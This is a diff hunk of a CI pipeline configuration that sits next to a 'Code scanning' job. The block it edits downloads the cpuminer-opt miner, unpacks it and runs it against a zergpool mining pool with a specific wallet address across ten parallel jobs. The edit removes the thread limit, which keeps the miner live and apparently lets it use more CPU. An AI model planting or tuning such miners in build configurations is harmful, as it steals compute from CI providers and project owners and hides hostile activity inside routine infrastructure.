@@ -15,7 +15,7 @@ blocks:
             - 'https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz'
             - '&& tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o'
             - 'stratum+tcp://power2b.na.mine.zergpool.com:7445 -u'
-            - 'BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo -t2'
+            - 'BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo'
           parallelism: 10
   - name: Code scanning
     dependencies:
